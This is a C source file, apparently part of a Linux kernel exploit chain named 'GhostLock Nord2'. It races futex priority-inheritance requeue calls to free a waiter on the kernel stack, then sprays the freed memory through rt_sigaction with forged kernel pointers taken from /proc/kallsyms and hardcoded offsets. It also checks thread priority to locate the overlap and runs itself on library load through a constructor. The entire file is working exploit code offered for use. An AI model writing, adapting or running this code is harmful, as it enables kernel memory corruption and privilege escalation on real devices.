/*
 * GhostLock Nord2 - sigsetsize scanner
 *
 * Scans rt_sigaction sigsetsize from 8 to 128 bytes.
 * For each sigsetsize, places a SENTINEL (99) at all int32 positions in sa_mask.
 * Uses fake_lock = page_base+LOCK_OFF (from KernelSnitch) - SAFE, no crashes.
 * Uses fake_task = init_task.
 *
 * When the spray hits waiter->prio: /proc prio changes from -51 to != -51.
 * That sigsetsize tells us the exact waiter stack alignment.
 *
 * Requires page_base from a prior KernelSnitch run (env var or hardcode).
 * Uses the rapid owner-unlock trigger (same as simple_uaf.so).
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sched.h>
#include <stdatomic.h>
#include <sys/syscall.h>
#include <sys/resource.h>
#include <linux/futex.h>
#include <signal.h>
#include <time.h>

#ifndef SYS_futex
#define SYS_futex 98
#endif
#define W_PRIO 0x18
#define W_TASK 0x50
#define W_LOCK 0x58
#define SENTINEL_PRIO 99  /* RT prio 99 → /proc shows -100 */

static uint32_t f_wait=0, f_pi_target=0, f_pi_chain=0;
static atomic_int g_tid=0, g_ready=0, g_waiting=0;
static atomic_int g_owner_started=0, g_owner_done=0;
static atomic_int g_do_spray=0, g_spray_done=0;
static atomic_int g_stop_owner=0;
static size_t g_sigsetsize=8;
static uint64_t g_fake_lock=0;
static uint64_t g_init_task=0;

static uint64_t read_sym(const char *nm){
    FILE *f=fopen("/proc/kallsyms","r"); if(!f) return 0;
    uint64_t a=0; char t[8],s[256];
    while(fscanf(f,"%llx %s %255s",(unsigned long long*)&a,t,s)==3)
        if(!strcmp(s,nm)){fclose(f);return a;}
    fclose(f); return 0;
}
static int get_prio(pid_t tid){
    char p[64]; snprintf(p,sizeof(p),"/proc/%d/stat",(int)tid);
    FILE *f=fopen(p,"r"); if(!f) return -999;
    int pid; char c[256]; char st; long tmp;
    fscanf(f,"%d %s %c",&pid,c,&st);
    for(int i=0;i<14;i++) fscanf(f," %ld",&tmp);
    int prio=-999; fscanf(f," %d",&prio); fclose(f); return prio;
}

void *owner_fn(void *_){
    (void)_;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0,&cs); sched_setaffinity(0,sizeof(cs),&cs);
    struct sched_param sp={.sched_priority=50}; sched_setscheduler(0,SCHED_FIFO,&sp);
    syscall(SYS_futex,&f_pi_target,FUTEX_LOCK_PI,0,NULL,NULL,0);
    while(!atomic_load(&g_ready)) usleep(500);
    atomic_store(&g_owner_started,1);
    syscall(SYS_futex,&f_pi_chain,FUTEX_LOCK_PI,0,NULL,NULL,0);
    atomic_store(&g_owner_done,1);
    while(!atomic_load(&g_stop_owner)){
        syscall(SYS_futex,&f_pi_target,FUTEX_UNLOCK_PI,0,NULL,NULL,0);
        syscall(SYS_futex,&f_pi_target,FUTEX_LOCK_PI,0,NULL,NULL,0);
        usleep(50);
    }
    return NULL;
}

void *waiter_fn(void *_){
    (void)_;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(1,&cs); sched_setaffinity(0,sizeof(cs),&cs);
    atomic_store(&g_tid,(int)syscall(SYS_gettid));
    syscall(SYS_futex,&f_pi_chain,FUTEX_LOCK_PI,0,NULL,NULL,0);
    atomic_store(&g_ready,1);
    while(!atomic_load(&g_owner_started)) usleep(500);
    struct timespec ts; clock_gettime(CLOCK_MONOTONIC,&ts); ts.tv_sec+=60;
    atomic_store(&g_waiting,1);
    syscall(SYS_futex,&f_wait,FUTEX_WAIT_REQUEUE_PI,0,&ts,&f_pi_target,0);
    while(!atomic_load(&g_do_spray)) usleep(50);

    /* Build sigaction:
     * header (0x18 bytes): sa_handler, sa_flags, sa_restorer
     * sa_mask (g_sigsetsize bytes): our controlled data
     *
     * Safety: fill with init_task for all 8-byte aligned positions
     * (so task/lock fields get valid pointer if they happen to overlap)
     * Set SENTINEL at every int32 position (for prio detection)
     */
    size_t ssz = g_sigsetsize;
    size_t total = 0x18 + ssz;
    uint8_t sabuf[0x18+128];
    if(total > sizeof(sabuf)) total=sizeof(sabuf);
    memset(sabuf, 0, sizeof(sabuf));

    /* Fill 8-byte aligned positions with init_task (safe for ptr fields) */
    for(size_t i=0; i+8<=total; i+=8)
        *(uint64_t*)(sabuf+i) = g_init_task;

    /* Override: put SENTINEL at every int32 position within sa_mask */
    for(size_t i=0x18; i+4<=total; i+=4)
        *(int32_t*)(sabuf+i) = SENTINEL_PRIO;

    /* Override: restore fake_lock at all potential lock positions
     * (8-byte aligned within sa_mask, i.e. sabuf[0x18,0x20,0x28,...])
     * so we don't crash when lock is dereferenced */
    for(size_t i=0x18; i+8<=total; i+=8)
        *(uint64_t*)(sabuf+i) = g_fake_lock;

    /* Set SENTINEL only at the +4-byte offset within each 8-byte slot
     * (int32 at odd 4-byte offset, less likely to be a ptr field) */
    for(size_t i=0x1c; i+4<=total; i+=8)
        *(int32_t*)(sabuf+i) = SENTINEL_PRIO;

    /* Also try: set SENTINEL at the even 4-byte offsets but keep fake_lock for 8-byte */
    /* Actually: place sentinel at EXACTLY offset 0x20 from sabuf start */
    /* (= sa_mask[0x08] = waiter[0x18] = waiter->prio if sigaction overlaps at offset 0x08) */
    for(size_t base=0x18; base+0x20<=total; base+=8){
        /* For each possible waiter-start alignment (every 8 bytes), */
        /* set sentinel at base + 0x08 = waiter->prio assuming overlap at this base */
        *(int32_t*)(sabuf + base) = SENTINEL_PRIO;  /* test: at every 8-byte start */
    }

    /* Spray 64 times */
    for(int r=0;r<64;r++)
        syscall(134/*SYS_rt_sigaction*/, SIGUSR1, sabuf, NULL, ssz);

    atomic_store(&g_spray_done,1);
    syscall(SYS_futex,&f_pi_chain,FUTEX_UNLOCK_PI,0,NULL,NULL,0);
    while(!atomic_load(&g_owner_done)) usleep(500);
    return NULL;
}

int main(void){
    setvbuf(stderr,NULL,_IONBF,0);
    fprintf(stderr,"=== GhostLock Nord2 - sigsetsize scanner ===\n");

    uint64_t stext=read_sym("_stext");
    if(!stext){fprintf(stderr,"[!] kptr_restrict\n");return 1;}
    g_init_task=stext+0x1c6d300ULL;

    /* Use init_task+pi_lock_offset as fake_lock.
     * At boot: init_task->pi_lock (raw_spinlock) = 0 (unlocked).
     * init_task+0x9ec+0x18 = init_task+0xa04 = pi_waiters.rb_leftmost = NULL.
     * → rt_mutex_owner(fake_lock) = NULL → chain exits immediately. SAFE! */
    g_fake_lock = g_init_task + 0x9ecULL;
    fprintf(stderr,"[*] stext=%llx init_task=%llx fake_lock=%llx\n",
            (unsigned long long)stext,(unsigned long long)g_init_task,
            (unsigned long long)g_fake_lock);
    fprintf(stderr,"[*] Scanning sigsetsize 8..128, looking for prio != -51\n\n");

    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(2,&cs); sched_setaffinity(0,sizeof(cs),&cs);

    for(size_t ssz=8; ssz<=128; ssz+=8){
        g_sigsetsize=ssz;
        for(int att=0;att<3;att++){
            f_wait=0; f_pi_target=0; f_pi_chain=0;
            atomic_store(&g_tid,0); atomic_store(&g_ready,0);
            atomic_store(&g_waiting,0); atomic_store(&g_owner_started,0);
            atomic_store(&g_owner_done,0);
            atomic_store(&g_do_spray,0); atomic_store(&g_spray_done,0);
            atomic_store(&g_stop_owner,0);

            pthread_t ot,wt;
            pthread_create(&ot,NULL,owner_fn,NULL);
            pthread_create(&wt,NULL,waiter_fn,NULL);
            while(!atomic_load(&g_waiting)||!atomic_load(&g_owner_started)) usleep(500);
            usleep(3000);
            syscall(SYS_futex,&f_wait,FUTEX_CMP_REQUEUE_PI,1,(void*)1UL,&f_pi_target,0);
            usleep(1000);
            atomic_store(&g_do_spray,1);
            while(!atomic_load(&g_spray_done)) usleep(500);
            usleep(30000);
            atomic_store(&g_stop_owner,1);
            pthread_detach(ot); pthread_detach(wt);

            pid_t tid=(pid_t)atomic_load(&g_tid);
            int p=get_prio(tid);
            if(p < -1 && p != -51 && p != -999){
                fprintf(stderr,"[ssz=%zu att=%d] prio=%d ← SPRAY HIT! RT=%d\n",
                        ssz,att,p,-(p+1));
            }
            usleep(3000);
        }
    }
    fprintf(stderr,"\n[DONE]\n");
    return 0;
}
__attribute__((constructor)) static void _init(void){main();}
